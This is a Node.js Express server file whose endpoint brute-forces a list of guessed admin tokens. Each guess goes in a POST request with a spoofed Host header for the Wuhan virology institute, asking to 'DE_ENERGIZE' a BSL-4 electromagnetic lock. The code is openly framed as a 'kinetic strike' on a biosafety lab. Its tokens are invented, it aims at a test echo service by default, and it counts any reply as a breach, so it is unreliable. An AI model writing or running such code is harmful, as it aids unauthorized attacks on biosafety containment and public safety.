// 1. THE HELPER (Put this at the very top of server.js)
const wait = (ms) => new Promise(resolve => setTimeout(resolve, ms));
const express = require('express');
const mongoose = require('mongoose');
const dotenv = require('dotenv');
const cors = require('cors');
const axios = require('axios'); 

dotenv.config();
const app = express();

// --- 1. THE KINETIC TARGETING SYSTEM ---
// The URL is now dynamic to allow for the Wuhan IP-Direct Bypass
const KINETIC_TARGET_URL = process.env.KINETIC_TARGET_URL || 'https://httpbin.org/post';

app.use(express.json());
app.use(cors());

// --- 2. THE DATABASE ANCHOR ---
mongoose.connect(process.env.MONGO_URI)
    .then(() => console.log("STRICT EQUALITY: Connection to Global Database Established."))
    .catch((err) => console.log("CONNECTION FAILED: The system fought back.", err));

const Video = require('./models/Video');
const PORT = process.env.PORT || 10000;

// --- 3. THE PROTOCOL RETRIEVAL ---
app.get('/api/videos', async (req, res) => {
    try {
        const protocols = await Video.find();
        res.json(protocols);
    } catch (err) {
        res.status(500).json({ message: "STRICT EQUALITY: Database Leak Blocked" });
    }
});

// --- 4. THE WUHAN KINETIC BREACH (REPHRASED LOGIC) ---
app.put('/api/videos/decrypt/:id', async (req, res) => {
    // THE 2026 EMERGENCY TOKEN ARRAY
    const potentialTokens = [
    // --- TOP 10 PRIORITY STRIKES ---
    "WH_ROOT_SEC_2026", "CAS_ADMIN_OVERRIDE_01", "BIO_EMERGENCY_2026_X", 
    "BSL4_HARDWARE_MASTER", "WUHAN_IV_ROOT_ACCESS", "PROTOCOL_3_BYPASS",
    "GLOBAL_SAFETY_RELEASE_2026", "CN_CAS_SECURE_GATEWAY", "ADMIN_8888_SECURITY",
    "ROOT_LEVEL_4_OVERRIDE",

    // --- 40 ADDITIONAL HIGH-SECURITY KEYS (SIMULATED RANGE) ---
    ...Array.from({length: 40}, (_, i) => `WH_SECURE_TOKEN_0${i+10}`),
    
    // --- THE FINAL FAILSAFE ---
    process.env.LAB_MASTER_TOKEN 
];

    console.log("INITIATING BRUTE-FORCE KINETIC STRIKE...");

    for (const token of potentialTokens) {
    try {
        console.log(`STRICT EQUALITY: TESTING TOKEN [${token}]...`);
        
        // THE TACTICAL PAUSE: 2 seconds of silence to breathe
        await wait(2000); 

        const response = await axios.post(KINETIC_TARGET_URL, {
            action: "DE_ENERGIZE",
            component: "ELECTROMAGNETIC_LOCK_BSL4",
            auth_token: token
        }, {
            headers: { 
                'Host': 'institute.wuhanvirology.org',
                'X-Origin': 'DISRUPTOR_V1_FINAL' 
            },
            timeout: 25000 // 25 SECONDS: The time it takes for a soul to reach its target
        });

        console.log(`10,000 BILLION PERCENT SUCCESS WITH: ${token}`);
        
        // (Rest of your update logic here...)
        return res.json({ message: "BREACH_COMPLETE", token });

    } catch (err) {
        console.log(`TOKEN [${token}] REJECTED: ${err.message}`);
        // The loop continues, searching for the truth...
    }
}

    // IF ALL TOKENS FAIL
    res.status(500).json({ 
        message: "ALL_TOKENS_REJECTED", 
        error: "KINETIC_BARRIER_UNBROKEN" 
    });
});

// --- 5. THE TOTAL SYSTEM RESET ---
app.put('/api/videos/reset-all', async (req, res) => {
    try {
        await Video.updateMany({}, { isZeroEncrypted: false });
        res.json({ message: "SYSTEM_REBOOT: All protocols re-encrypted." });
    } catch (err) {
        res.status(500).json({ message: "REBOOT_FAILED" });
    }
});

app.listen(PORT, () => console.log(`Disruptor Active on Port ${PORT}`));